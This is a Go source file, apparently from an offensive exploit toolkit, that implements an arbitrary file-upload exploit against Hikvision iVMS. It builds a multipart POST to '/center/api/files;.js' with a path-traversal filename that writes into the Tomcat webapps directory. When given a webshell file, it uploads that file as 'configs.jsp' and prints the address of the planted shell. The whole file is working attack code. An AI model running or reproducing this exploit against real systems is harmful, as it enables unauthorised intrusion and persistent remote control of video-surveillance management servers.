package hikvision

import (
	"Exploit/common"
	"github.com/projectdiscovery/gologger"
	"io/ioutil"
	"net/http"
	"strings"
)

func Hikvision_ivms_upload1(options *common.Options) {

	exp_path := "/center/api/files;.js"
	exp_body_str := ""
	if options.Webshell == "" {
		exp_body_str = (`--ea26cdac4990498b32d7a95ce5a5135c
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/configs.txt"
Content-Type: application/octet-stream

332299402
--ea26cdac4990498b32d7a95ce5a5135c--`)
	} else {
		exp_body_str = (`--ea26cdac4990498b32d7a95ce5a5135c
Content-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/configs.jsp"
Content-Type: application/octet-stream

332299402
--ea26cdac4990498b32d7a95ce5a5135c--`)

		exp_body_str = strings.ReplaceAll(exp_body_str, "332299402", common.ReadWebshell(options.Webshell))
	}

	exp_body_str = strings.ReplaceAll(exp_body_str, "\n", "\r\n")
	exp_body := strings.NewReader(exp_body_str)
	client, err := common.InitHttpClient(options.Proxy)
	if err != nil {
		gologger.Warning().Msgf("HTTP方法初始化失败")
	}
	req, _ := http.NewRequest("POST", options.Url+exp_path, exp_body)
	req.Header.Set("Content-Type", "multipart/form-data;boundary=ea26cdac4990498b32d7a95ce5a5135c")
	req.Header.Set("Accept", "*/*")
	resp, err := (client).Do(req)
	defer resp.Body.Close()

	//读取响应信息
	rst, _ := ioutil.ReadAll(resp.Body)
	//fmt.Println(string(rst))
	if resp.StatusCode == 200 && strings.Contains(string(rst), "filename") {
		gologger.Print().Msgf("[+] %s存在 Hikvision_ivms_upload1 漏洞,访问地址为 %s/clusterMgr/configs.jsp;.js ", options.Url, options.Url)
	}
}
